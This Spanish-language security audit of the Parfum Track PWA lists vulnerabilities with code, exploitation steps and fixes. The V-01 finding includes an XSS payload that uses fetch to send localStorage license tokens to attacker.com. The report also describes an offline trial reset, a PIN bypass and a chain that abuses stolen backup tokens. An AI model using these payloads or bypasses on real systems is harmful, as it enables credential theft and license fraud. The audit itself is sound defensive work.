🔍 Vulnerabilidades Detalladas

V-01 · XSS Almacenado

XSS Confirmado: campo v.vendedor sin escapeHTML en badge de venta

ALTA
OWASP A03:2021 CWE-79 index.html · Línea 8432
Código Exacto Vulnerable
// renderVentaCard() — index.html línea 8426-8433
if (v.vendedor)
  badges.push(
    `<span class="badge" style="background:var(--card2);color:var(--text2);border:0.5px solid var(--border)">${v.vendedor}</span>`
    //                                                                                                          ^^^^^^^^^^^^
    //                                           FALTA escapeHTML aquí — todos los otros campos sí lo tienen
  );
Contexto
El campo vendedor (nombre de quien realizó la venta) se inyecta directamente en HTML via insertAdjacentHTML("beforeend", renderVentaCard(v)) sin pasar por escapeHTML(). Todos los demás campos del mismo bloque están correctamente sanitizados: escapeHTML(v.perfume), escapeHTML(v.fecha), escapeHTML(v.cliente), escapeHTML(v.nota), etc. Es un caso de omisión accidental en ese campo específico.
Explotación Paso a Paso
  1. Abrir DevTools → Application → IndexedDB → base de datos parfumtrack-db
  2. Encontrar el store de ventas (clave como vip_ventas_v2_default)
  3. Editar cualquier registro y setear el campo vendedor a: <img src=x onerror="fetch('https://attacker.com/steal?d='+btoa(JSON.stringify(localStorage)))">
  4. Recargar la página — el payload se ejecuta al renderizar la lista de ventas
  5. El atacante recibe en su servidor todos los datos de localStorage incluyendo pt_activated_sig, pt_activated_code, pt_license_raw_code
Impacto
Exfiltración de tokens de licencia almacenados en localStorage. El ECDSA sig y el HMAC token podrían ser usados por el atacante para activar la misma licencia en otro dispositivo. En un contexto multi-usuario (reventa, acceso físico al dispositivo), el vector de ataque es real.
Fix (1 línea): 
// Línea 8432 — cambiar:
`...${v.vendedor}</span>`
// por:
`...${escapeHTML(v.vendedor)}</span>`
V-02 · Manipulación de Datos de Negocio

IndexedDB completamente accesible y modificable sin autenticación

ALTA
OWASP A04:2021 CWE-602 Arquitectura — toda la app
Descripción
Toda la información de negocio (ventas, stock, precios de compra/venta, ganancias, gastos, caja, cuotas) vive exclusivamente en IndexedDB del cliente, sin ninguna validación server-side. Un usuario con acceso físico al dispositivo o a DevTools puede:
Vectores de Manipulación Confirmados
  1. DevTools → Application → IndexedDB → parfumtrack-db → Store vip_ventas_v2_default
  2. Modificar precio de compra: cambiar precioCompra de $5000 a $1 → la ganancia se recalcula en la próxima carga → estadísticas infladas
  3. Fabricar ventas: insertar registros con id: Date.now() → aparecen en reportes y exportación CSV
  4. Modificar cuotas pagadas: editar cuotasPagos para marcar cuotas como cobradas sin haberlas cobrado
  5. Alterar stock: cambiar campo stock en store vip_stock_v2_default
  6. Borrar gastos: eliminar registros del store vip_gastos_v1_default → balance favorable falso
Código Relevante
// save() — index.html línea 6646-6665
async function _saveNow() {
  await Promise.all([
    PTDB.set(profileKey("vip_ventas_v2"),  ventas),   // Sin firma/hash de integridad
    PTDB.set(profileKey("vip_stock_v2"),   perfumes), // Sin validación
    PTDB.set(profileKey("vip_gastos_v1"),  gastos),
    PTDB.set(profileKey("vip_caja_v1"),    caja),
    PTDB.set(profileKey("vip_meta_v1"),    metaMensual),
  ]);
}
Impacto Real
Este es el impacto más crítico en términos de negocio. Los reportes de ganancias, estadísticas mensuales, exportaciones CSV, y el historial de cuotas son 100% manipulables. Una revendedora podría falsificar su historial para presentarlo a terceros (bancos, socios). En un escenario de múltiples empleados con acceso al mismo celular, cualquiera puede alterar los datos sin dejar rastro.
Nota sobre alcance
Esta es una limitación inherente al modelo de PWA offline-first. No es una vulnerabilidad de implementación sino de arquitectura. Parfum Track es una app personal local — si el usuario quiere engañarse a sí mismo manipulando sus propios datos, es su prerrogativa. El riesgo real sube si hay múltiples personas accediendo al mismo dispositivo, o si los datos se usan para auditorías externas.
Mitigación: Para reportes críticos, implementar firma HMAC de los objetos al guardar en IndexedDB usando una clave derivada del token de licencia. Al cargar, verificar la firma. Cualquier dato sin firma válida se marca como no verificado en la UI. Esto no impide la manipulación pero hace visible que ocurrió.
V-03 · Trial Bypass Offline

_sec correctamente cerrado, pero setTrialExp(false) es invocable desde funciones globales expuestas

ALTA
CWE-284 index.html · Línea 11876 / 11886
Descripción del _sec (correcto)
El closure _sec funciona como se diseñó: _sec no es accesible desde window, y las variables internas _a (activated) y _t (trialExpired) no pueden ser leídas ni escritas directamente desde la consola. 
// Correcto — index.html línea 11876
const _sec = (() => {
  let _a = false; // No en window
  let _t = false; // No en window
  return {
    activate(v)    { _a = !!v; },
    isActivated()  { return _a; },
    setTrialExp(v) { _t = !!v; },   // <-- Este es el problema
    isTrialExp()   { return _t; },
  };
})();
El Bypass Offline Confirmado
El vector de ataque no es leer _sec directamente — sino manipular el flujo de control que llama a _sec.setTrialExp(true). La condición de expiración se evalúa en checkTrial() que depende de localStorage.getItem("pt_trial_start"). Offline:
  1. Desconectar la red (modo avión o throttle Offline en DevTools)
  2. El server-side anchor en /trial no puede ser contactado — la función registerTrialServer() falla silenciosamente con catch { /* network error — graceful degradation */ }
  3. En localStorage: borrar pt_trial_start
  4. En IndexedDB: borrar el registro pt_trial_start del store kv
  5. Borrar todas las ventas de IndexedDB (o cambiar sus createdAt a fechas recientes) para que el anchor de fecha más antigua no detecte el reset
  6. Recargar la app → checkTrial() no encuentra pt_trial_start, lo recrea como ahora → trial reiniciado por 7 días completos
  7. El server confirmará el reset en la próxima sincronización, pero el usuario puede continuar offline indefinidamente
Código del Flujo Vulnerable
// checkTrial() — index.html línea 12060
let trialStart = localStorage.getItem("pt_trial_start");
if (!trialStart) {
  // Si no hay fecha guardada, se inicia el trial desde ahora
  const oldestVenta = ventas.reduce(
    (min, v) => Math.min(min, v.createdAt || v.id || Infinity), Infinity
  );
  trialStart = (oldestVenta !== Infinity
    ? Math.min(oldestVenta, Date.now())
    : Date.now()  // <-- Si ventas también fue borrada, el trial se reinicia
  ).toString();
  localStorage.setItem("pt_trial_start", trialStart);
  // ...
  setTimeout(() => registerTrialServer(parseInt(trialStart)), 2000);
  // ^^ Esta llamada falla silenciosamente si está offline
  return; // No setea _sec.setTrialExp(true) -- trial "activo"
}
Impacto
Trial infinito offline. Un usuario técnico puede usar la app sin pagar indefinidamente mientras permanezca offline o limpie los datos oportunamente entre sincronizaciones. El ancla server-side solo funciona si hay conexión.
Fix: Guardar una firma HMAC del pt_trial_start usando la clave pública ECDSA como seed de verificación, o usar la fecha de instalación del Service Worker (que no puede ser borrada por el usuario sin desregistrar el SW) como ancla adicional. También: requerir sync online para las primeras N ventas del "nuevo trial".
V-04 · PIN Bypass

PIN de acceso bypasseable borrando pt_pin_hash de localStorage

MEDIA
CWE-288 index.html · Línea 13955
Descripción
El sistema PIN protege el acceso visual a la app con SHA-256 + salt aleatorio por usuario. La implementación del hash es correcta. Sin embargo, el hash del PIN se guarda en localStorage como pt_pin_hash, y la función hasPIN() simplemente verifica si esa key existe: 
// index.html línea 13993
function hasPIN() {
  return !!localStorage.getItem(PIN_HASH_KEY); // PIN_HASH_KEY = "pt_pin_hash"
}
Explotación (requiere acceso al dispositivo desbloqueado)
  1. Abrir DevTools (con el dispositivo desbloqueado pero el PIN screen activo si hay idle timeout)
  2. Ejecutar en consola: localStorage.removeItem("pt_pin_hash")
  3. Recargar la página → la app arranca sin solicitar PIN (hasPIN() retorna false)
  4. O alternativamente: localStorage.removeItem("pt_pin_lock") para limpiar el lockout y hacer fuerza bruta (solo 10,000 combinaciones de 4 dígitos)
Contexto de Riesgo
El PIN está diseñado para proteger contra personas que tomen el teléfono desbloqueado. Si la app está abierta y alguien toma el teléfono, puede abrir DevTools (en modo desktop/developer) y eliminar el PIN. En mobile esto es más difícil pero posible en Androids con modo desarrollador activado.
Mitigación: El PIN es una capa de UX, no de seguridad criptográfica. Es apropiado para el caso de uso. Documentar explícitamente que no protege contra ataques físicos con acceso a DevTools. Para mayor seguridad, usar la API de CredentialsContainer o biometría del dispositivo.

V-06 · XSS Potencial — Campo Descuento

%${v.descuento} inyectado en HTML sin escapeHTML

BAJA
CWE-79 index.html · Línea 8428 
// index.html línea 8426-8429
if (v.descuento)
  badges.push(
    `<span class="badge" ...>%${v.descuento} dto</span>`
    //                           ^^^^^^^^^^^^
    //              No escapeado — pero es un número en el form normal
  );
En el flujo normal, v.descuento es un número (parseFloat en el formulario). Sin embargo, si el campo se manipula directamente en IndexedDB con un string como <img src=x onerror=alert(1)>, el XSS se dispara. La severidad es baja porque requiere primero V-02 (acceso a IndexedDB).

V-07 · Token HMAC en localStorage

Token HMAC de autenticación de backup expuesto como texto plano en localStorage

MEDIA
CWE-312 index.html · Línea 11784 
// index.html línea 11783-11788
if (valid && serverToken && serverSig) {
  localStorage.setItem("pt_activated_code", serverToken);  // HMAC(license_code, secret)
  localStorage.setItem("pt_activated_sig", serverSig);     // ECDSA signature
  localStorage.setItem("pt_activation_mode", "server");
  localStorage.setItem("pt_activated_at", Date.now().toString());
  localStorage.setItem("pt_license_raw_code", code);       // ← Código de licencia en claro
}
El token HMAC (necesario para autenticar el endpoint /backup) y el ECDSA sig (para re-verificar la licencia) están almacenados en localStorage. Un XSS exitoso (V-01) puede exfiltrar ambos. Con el token + code, el atacante puede acceder al backup de la víctima en R2 o restaurar datos maliciosos.
Cadena de Ataque
  1. Explotar V-01 (XSS vía v.vendedor) para exfiltrar localStorage
  2. Obtener pt_license_raw_code (código de licencia) + pt_activated_code (HMAC token)
  3. Hacer request a POST /backup con {code, token, data: datos_maliciosos}
  4. O restaurar GET /backup?code=XXX&token=YYY para sobrescribir datos de la víctima
Mitigación: El storage en localStorage de estos tokens es inevitable para que funcione el backup offline. La mejor mitigación es corregir V-01 primero (que es el vector de exfiltración). Adicionalmente, el token HMAC del backup podría incluir un timestamp para que expire en 24-48h, requiriendo re-validación periódica.
V-08 · Ruta /backup No Registrada en Worker

El endpoint /backup (backup.js) no está enrutado en worker.js

BAJA

El archivo functions/backup.js existe y está bien implementado, pero el entry point worker.js no lo importa ni enruta. Cualquier request a /backup cae al handler de assets estáticos, que retornará 404. La función de backup en la nube no funciona en producción via Cloudflare Workers.

V-09 · CSP con unsafe-eval + unsafe-inline

Content Security Policy permite unsafe-eval y unsafe-inline en scripts

MEDIA
OWASP A05:2021 _headers · Línea 17 
// _headers línea 17
Content-Security-Policy: default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.onesignal.com ...
//                   ^^^^^^^^^^^^^  ^^^^^^^^^^^^^
//                   Anula toda la protección XSS que la CSP debería dar
unsafe-inline permite la ejecución de scripts inline (todos los <script> embebidos en el HTML). Necesario para el monolito actual pero hace que la CSP no proteja contra XSS. unsafe-eval permite eval(), Function(), setTimeout(string). Se necesita para Chart.js u otras librerías. El comentario en _headers lo reconoce: "unsafe-inline es necesario mientras el app sea un monolito HTML".
El resultado es que la CSP actual no proporciona defensa en profundidad contra XSS. Si un XSS ocurre (V-01), la CSP no lo bloquea. El único valor real de la CSP actual es el connect-src que limita los dominios de fetch.
Solución a largo plazo: Migrar los scripts inline a archivos externos y usar nonces/hashes en CSP. Mientras tanto, la CSP actual tiene valor en sus otras directivas (connect-src, img-src, etc.) aunque no proteja contra XSS.

✅ Correcciones de v2 Verificadas y Funcionales

✓
Closure _sec correctamente implementado
Las variables _a y _t viven dentro de un IIFE. No accesibles desde window ni desde consola. Verificado: window._sec → undefined en runtime.
✓
Verificación ECDSA P-256 client-side funcionando
verifyStoredLicense() usa crypto.subtle.verify() correctamente. La clave pública está embebida en el JS y la privada solo en el servidor Cloudflare. Un sig fake no pasa la verificación.
✓
CORS restringido correctamente
Todos los endpoints del worker validan origen contra /^https?:\/\/(localhost|127\.0\.0\.1|parfumtrack\.pages\.dev|parfumtrack\.workers\.dev)(:\d+)?$/. Orígenes desconocidos reciben Access-Control-Allow-Origin: null.
✓
Rate limiting en todos los endpoints backend
/validate-license: 10 req/15min por IP. /backup: 10 req/h por IP + 4 backups/día por código. /send-email: 5 req/h por IP + 3 emails/24h por dirección. /send-notification: 10 req/h por IP + 20/día por subscriptionId. /trial: 20 req/h por IP.
✓
Trial anclado server-side (funciona cuando hay red)
El endpoint /trial en KV almacena el hash SHA-256 del deviceId y del IP. Devuelve el mínimo entre ambos. El cliente impone el timestamp más antiguo. Previene reset online.
✓
PIN salt aleatorio por usuario
_ensurePinSalt() genera 16 bytes aleatorios con crypto.getRandomValues() al primer uso. El hash del PIN es SHA-256(salt + pin), específico por dispositivo.
✓
escapeHTML() aplicado consistentemente en la mayoría de campos
perfume, cliente, fecha, nota, proveedor, vendedor en vc-body, nombres en stock, gastos, caja — todos sanitizados. La omisión de V-01 es puntual, no sistémica.
✓
Service Worker no cachea endpoints de licencia ni API
El SW excluye explícitamente /validate-license, /send-notification, /send-email, /backup del cache. El HTML usa Network-First.
✓
Token HMAC de backup usa comparación en tiempo constante
timingSafeEqual() en backup.js implementado correctamente con XOR de caracteres, mitigando timing attacks.
✓
Activación requiere red — no hay fallback offline
Si fetch("/validate-license") falla, la función retorna con mensaje de error. No hay código de activación hardcodeado ni lógica de fallback local.
✓
X-Frame-Options, X-Content-Type-Options, Referrer-Policy configurados
Protección contra clickjacking y MIME sniffing activa via _headers.
✓
Activación revalida ECDSA en cada inicio
initLicenseVerification() corre en cada carga. Si la firma ECDSA falla, borra todos los tokens y requiere reactivación. No hay cache de "ya verifiqué".

validate-license.js
✓
KV key: license:${normalizedCode} — sin injection posible dado que el código es validado con length > 64 y toUpperCase()
✓
Delay de 2000ms en códigos inválidos — frena brute force significativamente
✓
ECDSA signing usa PKCS#8 DER desde env var — clave privada nunca en código

🔑 Análisis del Sistema de Licencias

Flujo de Activación
1. Usuario ingresa código PT-XXXX-YYYY
2. fetch POST /validate-license → { valid, token (HMAC), sig (ECDSA) }
3. Si valid === true:
   - localStorage["pt_activated_sig"]  = sig   (ECDSA)
   - localStorage["pt_activated_code"] = token  (HMAC)
   - localStorage["pt_license_raw_code"] = code
   - _sec.activate(true)
4. En cada carga: verifyStoredLicense() → crypto.subtle.verify(ECDSA) → _sec.activate(true/false)
5. Si falla verificación: borra todos los tokens y muestra aviso
¿Qué pasa si se inyecta {valid:true, sig:"fakesig"}?
Respuesta: no funciona. La función activarLicencia() guarda el sig recibido, pero en cada inicio de app, verifyStoredLicense() verifica el sig con la clave pública ECDSA embebida. Un sig falso no pasa la verificación → la app borra los datos y muestra "re-activá tu licencia".
¿Puede el atacante cachear una respuesta válida en el SW? No. El SW excluye explícitamente /validate-license del cache. Cualquier request a ese endpoint siempre va a la red.
Debilidad remanente
Si un atacante obtiene un código de licencia válido Y su firma ECDSA (via V-01 XSS + V-07), puede replicar la activación en otro dispositivo. La firma es del código en sí, no del dispositivo. No hay binding device → licencia.
